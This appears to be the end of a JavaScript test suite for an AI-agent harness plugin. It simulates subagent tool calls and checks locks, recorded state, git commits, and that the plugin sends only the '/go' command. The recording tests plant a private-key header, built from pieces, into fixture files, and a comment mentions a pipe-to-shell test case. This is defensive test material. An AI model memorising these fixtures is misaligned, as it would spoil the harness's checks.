          await h["execute.after"]({ ...e, status: "error", error: `Subagent failed (sessionID: ${sid(s)}-child): Provider blocked the response` })
          continue
        }
        const out = { sessionID: `${sid(s)}-child`, status: "running", output: "" }
        await h["execute.after"](kind === "delegate_bg" ? { ...e, status: "completed", result: { output: out, metadata: out } } : { ...e, status: "completed", result: { output: "ok" } })
      }
      await sleep(5) // the plugin's event loop runs between ticks
    }
    const check = () => {
      const p = []
      const want = (op.sent ?? []).map(([s, slug]) => JSON.stringify({ sessionID: sid(s), name: "go", text: slug, delivery: "queue" }))
      const got = sent.map((a) => JSON.stringify(a))
      if (JSON.stringify(got) !== JSON.stringify(want)) p.push(`command() calls ${got.join(" ") || "none"}`)
      for (const x of op.state ?? []) {
        let doc = {}
        try { doc = JSON.parse(fs.readFileSync(path.join(root, "mini-projects", x.project, ".harness", "state.json"), "utf8")) } catch {}
        const v = at(doc, x.path)
        if (JSON.stringify(v) !== JSON.stringify(x.eq)) p.push(`${x.project} ${x.path} = ${JSON.stringify(v)}`)
      }
      let alive = ""
      try { alive = fs.readFileSync(ALIVE, "utf8") } catch {}
      for (const s of op.alive_has ?? []) if (!alive.includes(s)) p.push(`plugins-alive has no note naming ${s}`)
      for (const slug of op.locks_after ? op.locks ?? [] : []) {
        const want = typeof op.locks_after === "string" ? op.locks_after : op.locks_after[slug]
        if (want && fs.existsSync(lockOf(slug)) !== (want === "present")) p.push(`${slug} lock ${want === "present" ? "gone" : "still there"}`)
      }
      return p
    }
    let late = check() // cost writes wait on a python call: poll (up to 10 s under load), but give a wrong late write time to land first
    for (let i = 0; i < 200 && (i < 8 || late.length); i++) {
      await sleep(50)
      late = check()
    }
    problems.push(...late)
    if (op.go_after) { // the human's next /go (the fixture copy of next.py): not refused by a leftover lock
      const r = spawnSync("python3", [path.join(root, "scripts", "next.py"), op.go_after], { env: human, encoding: "utf8" })
      if (r.status !== 0 || r.stdout.includes("a chain is running")) problems.push(`/go ${op.go_after} refused: ${(r.stdout + r.stderr).trim().split("\n").slice(-2).join(" ")}`)
    }
    report(`loop/${op.id}`, problems.length === 0, "ok", problems.length ? "wrong" : "ok", `${op.note}${problems.length ? " :: " + problems.join("; ") : ""}`)
  }
}

// ap8: the plugin may only ever send /go (spec 3.2): the source has exactly one command( call, its name the literal "go"
{
  const src = fs.readFileSync(PLUGIN, "utf8")
  const calls = [...src.matchAll(/command\s*\(/g)]
  const args = calls.length === 1 ? src.slice(calls[0].index, src.indexOf(")", calls[0].index)) : ""
  const names = [...args.matchAll(/\bname\s*:\s*([^,}\s]+)/g)].map((m) => m[1])
  const ok = calls.length === 1 && JSON.stringify(names) === JSON.stringify(['"go"'])
  report("loop/ap8", ok, "ok", ok ? "ok" : "wrong", `static: exactly one command( call in the plugin and its name is the literal "go" :: ${calls.length} call(s), name ${names.join(" ") || "none"}`)
}

// recording (spec 6.3): step checks, VERIFY runs, the acceptance run, QA/VISUAL/REVIEW verdicts, all through one
// write queue; and the lock refresh. Projects are written here (after the lock section, which deletes every lock).
{
  const R = spec.record
  const hashOf = (fn, slug) => spawnSync("python3", ["-c", "import sys; sys.dont_write_bytecode = True; sys.path.insert(0, sys.argv[1]); " +
    "import harness_state as h; print(getattr(h, sys.argv[2])(sys.argv[3]))", HERE, fn, path.join(root, "mini-projects", slug)], { encoding: "utf8" }).stdout.trim()
  for (const [slug, p] of Object.entries(R.projects)) {
    const dir = path.join(root, "mini-projects", slug)
    fs.mkdirSync(path.join(dir, ".harness"), { recursive: true })
    for (const [rel, body] of Object.entries(p.files ?? {})) {
      fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true })
      fs.writeFileSync(path.join(dir, rel), body)
    }
    const st = JSON.stringify(p.state, null, 2) // "$TREE": the project's tree hash as its files stand now
    fs.writeFileSync(path.join(dir, ".harness", "state.json"), st.includes('"$TREE"') ? st.replaceAll('"$TREE"', JSON.stringify(hashOf("tree_sha256", slug))) : st)
    if (p.git) { // its own repo (spec 4.1 own-repo rule), its own identity, every file so far in one base commit
      fs.writeFileSync(path.join(dir, ".gitignore"), ".harness/\n")
      for (const args of [["init", "-q", "-b", "main"], ["config", "user.email", "gate-test@example.invalid"], ["config", "user.name", "gate-test"],
        ["add", "-A"], ["-c", "commit.gpgsign=false", "commit", "-qm", "base"]]) {
        const r = spawnSync("git", ["-c", "core.hooksPath=/dev/null", ...args], { cwd: dir, encoding: "utf8" })
        if (r.status !== 0) throw new Error(`git ${args[0]} failed in ${slug}: ${r.stderr}`)
      }
    }
  }
  const gitOut = (slug, ...args) => spawnSync("git", ["-C", path.join(root, "mini-projects", slug), ...args], { encoding: "utf8" }).stdout
  const PRIVATE_KEY = "-----BEGIN RSA " + "PRIVATE KEY-----" // built from pieces: this repo never holds the literal
  const h = await hooks("")
  const sid = (s) => `rec:${s}`
  const at = (doc, p) => p.split(".").reduce((o, k) => (o == null ? undefined : o[Array.isArray(o) ? Number(k) : k]), doc)
  for (const op of R.ops) {
    for (const [rel, body] of Object.entries(op.files ?? {})) {
      fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true })
      fs.writeFileSync(path.join(root, rel), body.replaceAll("$PRIVATE_KEY", PRIVATE_KEY))
    }
    for (const [c, p, title, agent] of op.created ?? []) created(sid(c), sid(p), title, agent)
    if (op.created) await sleep(20)
    const fire = (c) => {
      const input = JSON.parse(JSON.stringify(c.input).replaceAll("$ROOT", root))
      const ev = { tool: c.tool, input, agent: c.agent, sessionID: sid(c.sid), id: `call_${++callNo}`, messageID: "m" }
      if (c.hook === "before") return h["execute.before"](ev).catch(() => {})
      if (c.status === "error") return h["execute.after"]({ ...ev, status: "error", error: { message: c.error ?? "x" } })
      const r = c.result ?? {}
      return h["execute.after"]({ ...ev, status: "completed", result: { output: { ...r }, metadata: r.exit === undefined ? {} : { exit: r.exit } } })
    }
    if (op.together) await Promise.all(op.calls.map(fire))
    else for (const c of op.calls) await fire(c)
    const problems = []
    for (const x of op.expect) {
      if (x.git) { // the save points in the project's own repo: how many, and what the last one holds and says
        const g = x.git, count = Number(gitOut(x.project, "rev-list", "--count", "HEAD").trim())
        const files = gitOut(x.project, "show", "--name-only", "--format=", "HEAD").split("\n").filter(Boolean).sort()
        const msg = gitOut(x.project, "log", "-1", "--format=%B")
        if (g.count !== undefined && count !== g.count) problems.push(`${x.project} has ${count} commits`)
        if (g.subject !== undefined && msg.split("\n")[0] !== g.subject) problems.push(`${x.project} subject ${JSON.stringify(msg.split("\n")[0])}`)
        if (g.files && JSON.stringify(files) !== JSON.stringify(g.files)) problems.push(`${x.project} HEAD holds ${files.join(", ")}`)
        for (const want of [g.has, g.body_has].filter(Boolean)) if (!msg.includes(want)) problems.push(`${x.project} message lacks ${JSON.stringify(want)}`)
        continue
      }
      const rel = x.file ?? ".harness/state.json"
      let doc
      try {
        doc = JSON.parse(fs.readFileSync(path.join(root, "mini-projects", x.project, rel), "utf8"))
      } catch {
        problems.push(`${x.project}/${rel} unreadable`)
        continue
      }
      const v = at(doc, x.path)
      const want = x.eq === "$TREE" ? hashOf("tree_sha256", x.project) : x.eq === "$TESTS" ? hashOf("tests_sha256", x.project)
        : x.eq === "$HEAD" ? gitOut(x.project, "rev-parse", "HEAD").trim() : x.eq
      const ok = "set" in x ? (v != null) === x.set
        : "eq" in x ? JSON.stringify(v) === JSON.stringify(want)
        : "ne" in x ? v !== x.ne
        : "starts" in x ? typeof v === "string" && v.startsWith(x.starts)
        : "all" in x ? Array.isArray(v) && v.length === x.len && v.every((s) => s && s[x.all])
        : false
      if (!ok) problems.push(`${x.project} ${x.path} = ${(JSON.stringify(v) ?? "undefined").slice(0, 70)}`)
    }
    report(`record/${op.id}`, problems.length === 0, "ok", problems.length ? "wrong" : "ok", `${op.note}${problems.length ? " :: " + problems.join("; ") : ""}`)
  }
}

// what the plugin wrote must still pass the state library's strict load()
const written = [...spec.steps.projects, ...Object.keys(spec.record.projects), spec.scope.project]
const loadAll = spawnSync("python3", ["-c", "import sys; sys.dont_write_bytecode = True; sys.path.insert(0, sys.argv[1]); import harness_state as h\n" +
  "[h.load(p) for p in sys.argv[2:]]", HERE, ...written.map((p) => path.join(root, "mini-projects", p))], { encoding: "utf8" })
report("k14", loadAll.status === 0, "ok", loadAll.status === 0 ? "ok" : "wrong", `state written by the plugin passes harness_state.load()${loadAll.status ? " :: " + loadAll.stderr.trim().split("\n").pop() : ""}`)

// Tools that resolve paths from their own file location run as COPIES inside the fixture,
// so they read and write the fixture's .harness/, never the real one.
const REPO = path.resolve(HERE, "..")
const copyIn = (rel) => fs.cpSync(path.join(REPO, rel), path.join(root, rel), { recursive: true })
const okCase = (id, ok, note) => report(id, ok, "ok", ok ? "ok" : "wrong", note)


const total = spec.cases.length + spec.v4docs.length + spec.breaker.length + spec.parallel.length + spec.lock.length + spec.fallback.length + scriptCases.length + spec.sandbox.length + spec.steps.ops.length + spec.scope.ops.length + spec.browser.ops.length + spec.loop.ops.length + 1 + spec.record.ops.length + 1 + 3 // + 3: ap-approve/a6 (re-pointed to the policy layer, A15f) + a15a-wrap (wrapped pipe-to-shell, R18)
console.log(`\ngate-test: ${total - fail}/${total} passed`)
process.exit(fail ? 1 : 0)
